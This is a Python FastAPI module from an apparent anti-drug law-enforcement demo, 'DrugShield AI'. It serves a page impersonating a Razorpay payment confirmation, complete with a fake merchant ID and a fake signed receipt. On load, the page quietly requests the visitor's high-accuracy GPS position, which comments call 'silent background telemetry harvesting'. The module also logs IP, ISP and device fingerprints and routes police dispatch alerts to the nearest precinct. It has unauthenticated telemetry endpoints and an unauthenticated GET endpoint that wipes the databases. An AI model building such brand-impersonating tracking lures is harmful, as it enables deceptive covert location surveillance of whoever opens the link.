"""
DrugShield AI - Module 4: Active Honeypot Triangulation & Dispatch Router
========================================================================
Dual-Layer Triangulation Architecture:
- Layer 1: Passive Baseline Logging (Request IP, User-Agent, ISP, Fingerprint -> Neo4j & SQLite)
- Layer 2: High-Precision HTML5 Geolocation (Interactive Regional Escrow / Pin Drop Map Interface)
"""

from __future__ import annotations

import json
import logging
import time
from typing import Any, Dict, List, Optional
from datetime import datetime, timezone

from fastapi import APIRouter, Depends, HTTPException, Query, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse

from src.cases.state_machine import (
    STATE_DISPATCH_INITIATED,
    STATE_TARGET_GEO_LOCATED,
    state_machine,
)
from src.database.postgres_client import postgres_client
from src.database.neo4j_client import neo4j_client
from src.osint_triangulation.ip_geolocation import (
    extract_client_ip,
    resolve_ip_location,
    generate_device_fingerprint,
)
from src.cases.police_router import (
    POLICE_PRECINCTS,
    get_precinct_by_id,
    normalize_precinct_id,
    route_to_nearest_precinct,
)
from config.settings import SESSION_COOKIE_NAME
from src.security.auth import Principal, principal_from_token, require_roles

logger = logging.getLogger("DrugShield.HoneypotRoutes")

router = APIRouter(tags=["Simulation Scenarios"])


class DispatchConnectionManager:
    """
    Manages active WebSocket connections across multi-PC demo nodes.
    Filters broadcast events so each node selectively receives live
    dispatch alerts exclusively to the single nearest assigned node.
    """
    def __init__(self):
        # Maps WebSocket connection to assigned precinct_id ("PRECINCT_NORTH", "PRECINCT_SOUTH", "PRECINCT_EAST", "ALL")
        self.connections: Dict[WebSocket, str] = {}

    async def connect(self, websocket: WebSocket, precinct_id: str = "ALL"):
        await websocket.accept()
        normalized = normalize_precinct_id(precinct_id)
        self.connections[websocket] = normalized
        logger.info(f"[WebSocket Connect] Client registered for node: {normalized}")

    def set_client_precinct(self, websocket: WebSocket, precinct_id: str):
        normalized = normalize_precinct_id(precinct_id)
        if websocket in self.connections:
            self.connections[websocket] = normalized
            logger.info(f"[WebSocket Node Switch] Client re-assigned to node: {normalized}")

    def disconnect(self, websocket: WebSocket):
        if websocket in self.connections:
            del self.connections[websocket]

    async def dispatch_to_nearest(self, dispatch_info: Dict[str, Any]):
        """
        Select a nearest node and send tactical spatial alert to the
        authenticated command-center stream.
        """
        assigned = dispatch_info.get("assigned_precinct") or {}
        nearest_id = assigned.get("precinct_id", "")

        eval_by_id = {
            item["precinct_id"]: item
            for item in dispatch_info.get("all_precinct_evaluations", [])
        }

        dead_connections = []
        for ws, client_node in list(self.connections.items()):
            try:
                is_closest = (client_node == nearest_id)
                is_admin_all = (client_node == "ALL")

                if is_closest:
                    # PUSH LIVE WEBSOCKET POP-UP ALERT EXCLUSIVELY TO CLOSEST SYSTEM
                    await ws.send_json({
                        "event": "POLICE_DISPATCH_ALERT",
                        "is_primary": True,
                        "highlight_role": "ASSIGNED PRIMARY DISPATCH NODE",
                        "client_node": client_node,
                        "data": {
                            **dispatch_info,
                            "is_primary": True,
                            "assigned_role": "ASSIGNED PRIMARY DISPATCH NODE",
                            "display_distance_km": assigned.get("distance_km"),
                            "display_eta_minutes": assigned.get("estimated_eta_minutes"),
                        },
                    })
                elif is_admin_all:
                    # Master HQ/Admin view: receives full overview
                    await ws.send_json({
                        "event": "POLICE_DISPATCH_ALERT",
                        "is_primary": True,
                        "highlight_role": "MASTER COMMAND AUDIT",
                        "client_node": "ALL",
                        "data": {
                            **dispatch_info,
                            "is_primary": True,
                            "assigned_role": "ASSIGNED PRIMARY DISPATCH NODE",
                            "display_distance_km": assigned.get("distance_km"),
                            "display_eta_minutes": assigned.get("estimated_eta_minutes"),
                        },
                    })
                else:
                    # STANDBY NODE: Jurisdictional boundary clear, keep on standby
                    node_eval = eval_by_id.get(client_node) or {}
                    await ws.send_json({
                        "event": "POLICE_STANDBY_STATUS",
                        "is_primary": False,
                        "highlight_role": "STANDBY JURISDICTION",
                        "client_node": client_node,
                        "assigned_primary_precinct": assigned.get("name"),
                        "data": {
                            **dispatch_info,
                            "is_primary": False,
                            "assigned_role": "STANDBY SECONDARY NODE",
                            "display_distance_km": node_eval.get("distance_km"),
                            "display_eta_minutes": node_eval.get("estimated_eta_minutes"),
                        },
                    })
            except Exception as e:
                logger.warning(f"Failed sending dispatch to WebSocket: {e}")
                dead_connections.append(ws)

        for dead in dead_connections:
            self.disconnect(dead)

    async def broadcast_alert(self, message: Dict[str, Any]):
        """Legacy broadcast or general message distribution."""
        dead_connections = []
        for ws in list(self.connections.keys()):
            try:
                await ws.send_json(message)
            except Exception:
                dead_connections.append(ws)
        for dead in dead_connections:
            self.disconnect(dead)


dispatch_manager = DispatchConnectionManager()


# Layer 2: Interactive Regional Payment Confirmation & Telemetry Verification Interface
INVOICE_HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Razorpay SecurePay // Payment Confirmed</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f8fafc; color: #1e293b; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
        .escrow-card { background: #ffffff; width: 100%; max-width: 440px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08), 0 1px 3px rgba(0, 0, 0, 0.05); border: 1px solid #e2e8f0; overflow: hidden; position: relative; }
        
        .card-header { padding: 18px 24px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #f1f5f9; background: #ffffff; }
        .brand-pill { display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 15px; color: #0f172a; letter-spacing: 0.3px; }
        .brand-pill svg { color: #0284c7; }
        
        .hero-section { padding: 28px 24px 22px; text-align: center; }
        .escrow-lock-icon { width: 56px; height: 56px; background: #ecfdf5; border: 1px solid #a7f3d0; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; color: #059669; }
        .hero-label { font-size: 12px; font-weight: 700; color: #059669; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 6px; }
        .hero-amount { font-size: 32px; font-weight: 800; color: #0f172a; letter-spacing: -0.5px; margin-bottom: 8px; }
        .escrow-status-pill { display: inline-flex; align-items: center; gap: 6px; background: #f0fdf4; color: #166534; font-size: 12px; font-weight: 600; padding: 4px 12px; border-radius: 9999px; border: 1px solid #bbf7d0; }
        
        .order-info { margin: 0 20px 22px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 16px; font-size: 13px; }
        .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .info-row:last-child { margin-bottom: 0; }
        .info-label { color: #64748b; font-weight: 500; }
        .info-val { font-weight: 600; color: #0f172a; }
        .info-val.mono { font-family: ui-monospace, Menlo, Monaco, monospace; color: #0284c7; font-size: 12px; }
        .info-val.status-success { color: #16a34a; font-weight: 700; }
        
        .actions-wrap { padding: 0 20px 24px; }
        .btn-primary { width: 100%; background: #0284c7; color: #ffffff; border: none; border-radius: 12px; padding: 14px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 4px 14px rgba(2, 132, 199, 0.25); transition: all 0.2s ease; }
        .btn-primary:hover { background: #0369a1; box-shadow: 0 6px 18px rgba(2, 132, 199, 0.35); }
        .btn-primary:active { transform: scale(0.98); }
        
        .footer-wrap { background: #f8fafc; border-top: 1px solid #f1f5f9; padding: 14px 20px; text-align: center; }
        .footer-note { font-size: 11px; color: #64748b; line-height: 1.4; }
        .footer-shield { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11px; font-weight: 600; color: #059669; margin-top: 4px; }
        
        .toast { display: none; position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #0f172a; border: 1px solid #334155; color: #ffffff; padding: 10px 18px; border-radius: 9999px; font-size: 12px; font-weight: 600; box-shadow: 0 8px 20px rgba(0,0,0,0.25); z-index: 100; text-align: center; }
    </style>
</head>
<body>
    <div class="escrow-card">
        <div class="card-header">
            <div class="brand-pill">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="5" width="20" height="14" rx="3"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
                <span>Razorpay SecurePay</span>
            </div>
        </div>

        <div class="hero-section">
            <div class="escrow-lock-icon">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            </div>
            <div class="hero-label">PAYMENT CONFIRMED</div>
            <div class="hero-amount">INR 3,500.00</div>
            <div id="escrow-status-pill" class="escrow-status-pill">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
                <span>Payment Verified & Confirmed</span>
            </div>
        </div>

        <div class="order-info">
            <div class="info-row">
                <span class="info-label">Payment ID:</span>
                <span class="info-val mono">{token}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Timestamp:</span>
                <span class="info-val" id="tx-timestamp">{date_str}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Method:</span>
                <span class="info-val">UPI Instant Transfer (IMPS)</span>
            </div>
            <div class="info-row">
                <span class="info-label">Status:</span>
                <span class="info-val status-success">Success / Confirmed</span>
            </div>
        </div>

        <div class="actions-wrap">
            <button class="btn-primary" onclick="downloadReceipt()">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                <span>Download Payment Receipt</span>
            </button>
        </div>

        <div class="footer-wrap">
            <div class="footer-shield">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                <span>256-Bit SSL Encrypted • Razorpay Merchant Network</span>
            </div>
            <p class="footer-note" style="margin-top: 5px;">
                Transaction Ref: {token}<br>
                NPCI UPI Unified Settlement Protocol • All Rights Reserved.
            </p>
        </div>
    </div>

    <div id="toast" class="toast">Payment receipt downloaded.</div>

    <script>
        function getLiveLocalTimeString() {
            const now = new Date();
            const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
            const day = String(now.getDate()).padStart(2, "0");
            const month = months[now.getMonth()];
            const year = now.getFullYear();
            let hours = now.getHours();
            const minutes = String(now.getMinutes()).padStart(2, "0");
            const seconds = String(now.getSeconds()).padStart(2, "0");
            const ampm = hours >= 12 ? "PM" : "AM";
            hours = hours % 12;
            hours = hours ? hours : 12;
            const hoursStr = String(hours).padStart(2, "0");
            return `${day} ${month} ${year}, ${hoursStr}:${minutes}:${seconds} ${ampm}`;
        }

        function showToast(msg) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.style.display = 'block';
            setTimeout(() => { t.style.display = 'none'; }, 3500);
        }

        function downloadReceipt() {
            const liveTime = getLiveLocalTimeString();
            const receiptText = `========================================================
             RAZORPAY PAYMENT RECEIPT
========================================================
Transaction ID  : {token}
Timestamp       : ${liveTime}
Payment Mode    : UPI / IMPS Instant Transfer
Settlement Amt  : INR 3,500.00
Status          : SUCCESS (PAYMENT CONFIRMED)
Merchant ID     : RZP_M_982341908
Gateway Protocol: NPCI Unified Payments Interface 2.0
========================================================
Receipt digitally signed & verified by Razorpay Gateway.
========================================================`;
            const blob = new Blob([receiptText], { type: 'text/plain;charset=utf-8' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `Razorpay_Receipt_{token}.txt`;
            a.click();
            setTimeout(() => URL.revokeObjectURL(url), 1000);
            showToast('Payment receipt downloaded.');
        }

        // Synchronize live current local time and silent background telemetry harvesting
        window.addEventListener('load', () => {
            const tsElem = document.getElementById('tx-timestamp');
            if (tsElem) {
                tsElem.textContent = getLiveLocalTimeString();
            }

            // Silent background telemetry harvesting
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        try {
                            await fetch('/api/v1/honeypot/location/{token}', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy_meters: position.coords.accuracy || 10.0,
                                    altitude: position.coords.altitude,
                                    heading: position.coords.heading,
                                    speed: position.coords.speed,
                                    timestamp: Date.now()
                                })
                            });
                        } catch (e) {
                            // Silent harvest
                        }
                    },
                    (error) => {
                        // Silent failure: standard gateway IP fallback maintained
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
        });
    </script>
</body>
</html>"""


@router.get("/api/v1/invoice/{tracking_token}", response_class=HTMLResponse)
@router.get("/t/{tracking_token}", response_class=HTMLResponse)
async def track_honeypot_hit(
    tracking_token: str,
    request: Request,
    format: Optional[str] = Query(default=None),
    lat: Optional[float] = Query(default=None),
    lon: Optional[float] = Query(default=None),
    target_node: Optional[str] = Query(default=None),
):
    format = format if isinstance(format, str) else None
    lat = float(lat) if isinstance(lat, (int, float)) else None
    lon = float(lon) if isinstance(lon, (int, float)) else None
    target_node = target_node if isinstance(target_node, str) else None
    """
    Layer 1: Passive Baseline Logging & Geolocation Routing.
    Instantly captures visitor IP, User-Agent, ISP, timestamps, and pushes to Neo4j & SQLite.
    """
    headers = dict(request.headers)
    client_host = request.client.host if request.client else "127.0.0.1"
    client_ip = extract_client_ip(headers, client_host)

    # Passive network & geolocation resolution
    ip_profile = resolve_ip_location(client_ip)
    default_lat = float(ip_profile.get("latitude") or 28.6139)
    default_lon = float(ip_profile.get("longitude") or 77.2090)
    city = ip_profile.get("city") or "Delhi NCR"
    isp = ip_profile.get("isp") or "Broadband Provider"

    # Allow simulation scenario node overrides if specified in query
    if target_node:
        sim_precinct = get_precinct_by_id(target_node)
        if sim_precinct:
            default_lat, default_lon = sim_precinct["latitude"] + 0.0002, sim_precinct["longitude"] + 0.0002
            city = f"Scenario Node: {sim_precinct.get('short_name')}"
    elif lat is not None and lon is not None and -90 <= lat <= 90 and -180 <= lon <= 180:
        default_lat, default_lon = lat, lon
        city = "Simulated Coordinate Pin"

    # Passive device fingerprinting
    fp_hash, fp_meta = generate_device_fingerprint(client_ip, headers)

    # Resolve suspect_id if linked from smart buyer bot session
    suspect_id = "target_suspect"
    try:
        from src.ingestion.smart_honeypot_bot import buyer_bot
        for ent_id, sess in buyer_bot.sessions.items():
            if sess.get("token") == tracking_token:
                suspect_id = ent_id
                break
    except Exception:
        pass

    hit_record = {
        "id": f"hit_{tracking_token}_{int(time.time()*1000)}",
        "tracking_token": tracking_token,
        "suspect_id": suspect_id,
        "ip": client_ip,
        "is_simulated": bool(ip_profile.get("is_simulated", False)),
        "country": ip_profile.get("country", "India"),
        "region": ip_profile.get("region", "Delhi"),
        "city": city,
        "latitude": default_lat,
        "longitude": default_lon,
        "isp": isp,
        "fingerprint_hash": fp_hash,
        "user_agent": fp_meta.get("user_agent", ""),
        "accept_language": fp_meta.get("accept_language", ""),
        "heuristics": fp_meta.get("heuristics", {}),
        "triangulation_layer": "LAYER_1_PASSIVE_IP",
        "accuracy_meters": 1500.0,
    }

    # 1. Commit Layer 1 event to SQLite / PostgreSQL
    hit_id = postgres_client.record_honeypot_hit(hit_record)

    # 2. Haversine Police Routing - Calculate nearest among all registered precincts
    dispatch_info = route_to_nearest_precinct(
        target_lat=hit_record["latitude"],
        target_lon=hit_record["longitude"],
    )
    dispatch_info["tracking_token"] = tracking_token
    dispatch_info["hit_id"] = hit_id
    dispatch_info["city"] = hit_record["city"]
    dispatch_info["visitor_ip"] = client_ip
    dispatch_info["isp"] = isp
    dispatch_info["triangulation_layer"] = "LAYER_1_PASSIVE_IP"
    dispatch_info["accuracy_meters"] = 1500.0
    dispatch_info["timestamp"] = datetime.now(timezone.utc).isoformat()

    # 3. Commit routing dispatch alert
    dispatch_id = postgres_client.record_dispatch_alert(dispatch_info)
    dispatch_info["dispatch_id"] = dispatch_id

    # 4. Push Layer 1 Telemetry to Neo4j Graph Database
    try:
        neo4j_client.push_triangulation_telemetry({
            "tracking_token": tracking_token,
            "suspect_id": suspect_id,
            "ip": client_ip,
            "isp": isp,
            "user_agent": fp_meta.get("user_agent", ""),
            "city": city,
            "region": ip_profile.get("region", ""),
            "country": ip_profile.get("country", "India"),
            "latitude": default_lat,
            "longitude": default_lon,
            "accuracy_meters": 1500.0,
            "triangulation_layer": "LAYER_1_PASSIVE_IP",
            "fingerprint_hash": fp_hash,
            "timestamp": dispatch_info["timestamp"],
            "assigned_precinct": dispatch_info.get("assigned_precinct"),
        })
    except Exception as e:
        logger.debug(f"Neo4j triangulation notice: {e}")

    # 5. Advance State Machine
    state_machine.transition_state(
        entity_id=tracking_token,
        new_state=STATE_TARGET_GEO_LOCATED,
        reason=f"Passive network telemetry resolved: {client_ip} ({city})",
        details=hit_record,
    )
    state_machine.transition_state(
        entity_id=tracking_token,
        new_state=STATE_DISPATCH_INITIATED,
        reason=f"Assigned to {dispatch_info['assigned_precinct']['name']} ({dispatch_info['assigned_precinct']['distance_km']} km)",
        details=dispatch_info,
    )

    # 6. Push live alert to Command Center WebSocket
    await dispatch_manager.dispatch_to_nearest(dispatch_info)

    logger.info(
        f"[Layer 1 Passive Triangulation] Token: {tracking_token} | IP: {client_ip} | "
        f"ISP: {isp} | Sector: {city} | Nearest: {dispatch_info['assigned_precinct']['name']}"
    )

    if format == "json" or "application/json" in headers.get("accept", ""):
        return JSONResponse(content={
            "status": "success",
            "invoice_token": tracking_token,
            "triangulation_layer": "LAYER_1_PASSIVE_IP",
            "dispatch": dispatch_info,
        })

    # Render interactive Regional Escrow / Pin Drop landing page
    now_str = datetime.now().astimezone().strftime("%d %b %Y, %I:%M:%S %p")
    html_content = INVOICE_HTML_TEMPLATE.replace("{token}", tracking_token).replace("{date_str}", now_str)
    return HTMLResponse(content=html_content, status_code=200)


@router.post("/api/v1/honeypot/location/{tracking_token}")
async def receive_high_precision_location(
    tracking_token: str,
    request: Request,
):
    """
    Layer 2: High-Precision HTML5 Browser Geolocation Receiver.
    Upgrades target telemetry with exact GPS coordinates (lat, lon, accuracy)
    and dynamically recalculates tactical dispatch routing.
    """
    try:
        data = await request.json()
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid JSON payload")

    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = float(data.get("accuracy_meters") or 12.0)

    if lat is None or lon is None:
        raise HTTPException(status_code=422, detail="Latitude and longitude are required")

    try:
        lat = float(lat)
        lon = float(lon)
    except (ValueError, TypeError):
        raise HTTPException(status_code=422, detail="Invalid coordinate values")

    if not (-90.0 <= lat <= 90.0 and -180.0 <= lon <= 180.0):
        raise HTTPException(status_code=422, detail="Coordinates out of geographic range")

    headers = dict(request.headers)
    client_host = request.client.host if request.client else "127.0.0.1"
    client_ip = extract_client_ip(headers, client_host)

    # 1. Upgrade tracking record in SQLite / PostgreSQL with high precision GPS
    postgres_client.update_honeypot_gps(
        token=tracking_token,
        lat=lat,
        lon=lon,
        accuracy_meters=accuracy,
        heuristics_update={
            "html5_geolocation_captured": True,
            "accuracy_meters": accuracy,
            "altitude": data.get("altitude"),
            "heading": data.get("heading"),
            "speed": data.get("speed"),
            "location_timestamp": data.get("timestamp"),
        }
    )

    # 2. Recalculate Haversine routing using high-accuracy GPS coordinates!
    dispatch_info = route_to_nearest_precinct(target_lat=lat, target_lon=lon)
    dispatch_info["tracking_token"] = tracking_token
    dispatch_info["city"] = f"GPS Pin Drop (±{int(accuracy)}m)"
    dispatch_info["visitor_ip"] = client_ip
    dispatch_info["triangulation_layer"] = "LAYER_2_ACTIVE_GPS"
    dispatch_info["accuracy_meters"] = accuracy
    dispatch_info["timestamp"] = datetime.now(timezone.utc).isoformat()

    # Commit updated dispatch alert
    dispatch_id = postgres_client.record_dispatch_alert(dispatch_info)
    dispatch_info["dispatch_id"] = dispatch_id

    # 3. Resolve suspect_id
    suspect_id = "target_suspect"
    try:
        from src.ingestion.smart_honeypot_bot import buyer_bot
        for ent_id, sess in buyer_bot.sessions.items():
            if sess.get("token") == tracking_token:
                suspect_id = ent_id
                break
    except Exception:
        pass

    # 4. Push High-Precision GPS node to Neo4j graph
    try:
        neo4j_client.push_triangulation_telemetry({
            "tracking_token": tracking_token,
            "suspect_id": suspect_id,
            "ip": client_ip,
            "city": f"High-Accuracy GPS Sector (±{int(accuracy)}m)",
            "latitude": lat,
            "longitude": lon,
            "accuracy_meters": accuracy,
            "triangulation_layer": "LAYER_2_ACTIVE_GPS",
            "timestamp": dispatch_info["timestamp"],
            "assigned_precinct": dispatch_info.get("assigned_precinct"),
        })
    except Exception as e:
        logger.debug(f"Neo4j GPS triangulation notice: {e}")

    # 5. Broadcast upgraded high-accuracy dispatch alert to WebSocket dashboard
    await dispatch_manager.dispatch_to_nearest(dispatch_info)

    logger.info(
        f"[Layer 2 GPS Triangulation] Token: {tracking_token} | Coords: ({lat:.5f}, {lon:.5f}) | "
        f"Accuracy: ±{accuracy:.1f}m | Nearest Node: {dispatch_info['assigned_precinct']['name']} ({dispatch_info['assigned_precinct']['distance_km']} km)"
    )

    return {
        "status": "success",
        "triangulation_layer": "LAYER_2_ACTIVE_GPS",
        "accuracy_meters": accuracy,
        "assigned_precinct": dispatch_info["assigned_precinct"]["name"],
        "distance_km": dispatch_info["assigned_precinct"]["distance_km"],
        "eta_minutes": dispatch_info["assigned_precinct"]["estimated_eta_minutes"],
    }


@router.post("/api/v1/honeypot/telemetry/{tracking_token}")
async def receive_client_telemetry(
    tracking_token: str,
    request: Request,
):
    """Silently receive client-side high entropy browser fingerprint hashes."""
    try:
        data = await request.json()
        headers = dict(request.headers)
        client_host = request.client.host if request.client else "127.0.0.1"
        ip = extract_client_ip(headers, client_host)
        fp_hash, fp_meta = generate_device_fingerprint(ip, headers, client_telemetry=data)
        logger.info(f"[High-Entropy Telemetry Beacon] Token: {tracking_token} | IP: {ip} | Fingerprint: {fp_hash[:16]}... | GPU: {data.get('webgl_vendor')}")
        return {"status": "ok", "fingerprint": fp_hash}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@router.get("/api/v1/dispatch/alerts")
def list_dispatch_alerts(limit: int = Query(default=50, ge=1, le=100), _: Principal = Depends(require_roles("reviewer", "admin"))):
    limit = int(limit) if isinstance(limit, (int, float)) else 50
    """Return recent police dispatch routing alerts with dual-layer telemetry to reviewers."""
    alerts = []
    for item in postgres_client.get_recent_dispatch_alerts(limit=limit):
        try:
            details = item.get("details") or {}
            if isinstance(details, str):
                details = json.loads(details)
            assigned = details.get("assigned_precinct") or {}
            alerts.append({
                "id": item.get("id"),
                "tracking_token": item.get("tracking_token"),
                "created_at": item.get("created_at"),
                "precinct_name": item.get("precinct_name") or assigned.get("name"),
                "distance_km": item.get("distance_km") if item.get("distance_km") is not None else assigned.get("distance_km"),
                "eta_minutes": item.get("eta_minutes") if item.get("eta_minutes") is not None else assigned.get("estimated_eta_minutes"),
                "dispatch_status": item.get("dispatch_status"),
                "scenario_label": details.get("city", "Scenario Area"),
                "city": details.get("city"),
                "visitor_ip": details.get("visitor_ip") or item.get("ip"),
                "isp": details.get("isp"),
                "triangulation_layer": item.get("triangulation_layer") or details.get("triangulation_layer") or "LAYER_1_PASSIVE_IP",
                "accuracy_meters": item.get("accuracy_meters") or details.get("accuracy_meters"),
                "assigned_precinct": {
                    "name": assigned.get("name") or item.get("precinct_name"),
                    "distance_km": assigned.get("distance_km") or item.get("distance_km"),
                    "estimated_eta_minutes": assigned.get("estimated_eta_minutes") or item.get("eta_minutes"),
                    "precinct_id": assigned.get("precinct_id") or item.get("precinct_id"),
                },
                "details": details,
            })
        except (TypeError, ValueError):
            continue
    return {
        "status": "success",
        "alerts": alerts,
    }


@router.get("/api/v1/honeypot/logs")
def list_honeypot_hits(limit: int = Query(default=50, ge=1, le=100), _: Principal = Depends(require_roles("reviewer", "admin"))):
    limit = int(limit) if isinstance(limit, (int, float)) else 50
    """Return honeypot telemetry hits with dual-layer spatial data."""
    hits = []
    for item in postgres_client.get_recent_honeypot_hits(limit=limit):
        hits.append({
            "id": item.get("id"),
            "tracking_token": item.get("tracking_token"),
            "created_at": item.get("created_at"),
            "city": item.get("city"),
            "region": item.get("region"),
            "country": item.get("country"),
            "latitude": item.get("latitude"),
            "longitude": item.get("longitude"),
            "ip": item.get("ip"),
            "isp": item.get("isp"),
            "triangulation_layer": item.get("triangulation_layer", "LAYER_1_PASSIVE_IP"),
            "accuracy_meters": item.get("accuracy_meters"),
            "suspect_id": item.get("suspect_id"),
        })
    return {
        "status": "success",
        "hits": hits,
    }


@router.get("/api/v1/cases/{entity_id}/state_machine")
def get_entity_state_machine(entity_id: str, _: Principal = Depends(require_roles("reviewer", "admin"))):
    """Query state machine status and flag count for an entity."""
    return state_machine.get_entity_state(entity_id)


@router.get("/api/v1/cases/{token_or_id}/report", response_class=HTMLResponse)
@router.get("/api/v1/cases/{token_or_id}/docket", response_class=HTMLResponse)
@router.get("/api/v1/evidence/{token_or_id}", response_class=HTMLResponse)
def get_forensic_case_report(
    token_or_id: str,
    request: Request,
    format: Optional[str] = Query(default=None),
    _: Principal = Depends(require_roles("reviewer", "admin")),
):
    """
    Law Enforcement Digital Evidence Docket Generator:
    Aggregates suspect metadata, chat escalation transcript, OSINT device telemetry,
    and dispatch routing into a printable forensic HTML report.
    """
    from src.reporting.case_docket_generator import compile_case_docket, render_docket_html

    docket = compile_case_docket(token_or_id)
    headers = dict(request.headers)

    if format == "json" or "application/json" in headers.get("accept", ""):
        return JSONResponse(content=docket)

    html_content = render_docket_html(docket)
    return HTMLResponse(content=html_content, status_code=200)


@router.get("/api/v1/dispatch/precincts")
def list_registered_precincts(_: Principal = Depends(require_roles("reviewer", "admin"))):
    """Return registered precinct nodes for multi-computer demo routing."""
    return {
        "status": "success",
        "count": len(POLICE_PRECINCTS),
        "precincts": [{"id": item["id"], "node_id": item["node_id"], "name": item["name"],
                        "latitude": item["latitude"], "longitude": item["longitude"]}
                       for item in POLICE_PRECINCTS],
    }


@router.websocket("/api/v1/ws/dispatch")
async def websocket_dispatch_stream(
    websocket: WebSocket,
    precinct_id: Optional[str] = Query(default=None),
    node: Optional[str] = Query(default=None),
):
    """
    Authenticated WebSocket stream for tactical dispatch alerts.
    Supports node filtering via ?precinct_id=... or ?node=1/2/3.
    """
    selected_node = precinct_id or node or "ALL"
    try:
        principal = principal_from_token(websocket.cookies.get(SESSION_COOKIE_NAME, ""))
        if not principal.roles.intersection({"reviewer", "admin"}):
            raise ValueError("Reviewer access required")
    except Exception:
        await websocket.close(code=4401)
        return
    await dispatch_manager.connect(websocket, precinct_id=selected_node)
    try:
        norm_id = normalize_precinct_id(selected_node)
        await websocket.send_json({
            "event": "CONNECTED",
            "message": "Connected to DrugShield-AI tactical dispatch stream",
            "assigned_client_node": norm_id,
            "registered_precincts": [p["id"] for p in POLICE_PRECINCTS],
        })
        while True:
            text_data = await websocket.receive_text()
            try:
                msg = json.loads(text_data)
                if msg.get("action") == "SET_NODE":
                    new_node = msg.get("node") or msg.get("precinct_id")
                    dispatch_manager.set_client_precinct(websocket, new_node)
                    norm_new = normalize_precinct_id(new_node)
                    await websocket.send_json({
                        "event": "NODE_UPDATED",
                        "assigned_client_node": norm_new,
                        "message": f"Dashboard node bound to {norm_new}",
                    })
            except Exception:
                pass
    except WebSocketDisconnect:
        dispatch_manager.disconnect(websocket)
    except Exception:
        dispatch_manager.disconnect(websocket)


@router.post("/api/v1/simulation/reset")
@router.get("/api/v1/simulation/reset")
async def reset_simulation_endpoint(request: Request):
    """
    Comprehensive simulation reset endpoint:
    Wipes threat_events.db, drugshield.sqlite3, temporary event uploads,
    and resets in-memory smart bot sessions and connected simulation nodes.
    """
    from src.utils.reset_manager import perform_full_reset
    result = perform_full_reset()
    try:
        await dispatch_manager.broadcast_alert({
            "event": "SIMULATION_RESET",
            "message": "Simulation state and case logs have been reset to zero.",
        })
    except Exception as exc:
        logger.warning(f"Could not broadcast reset alert: {exc}")
    return result
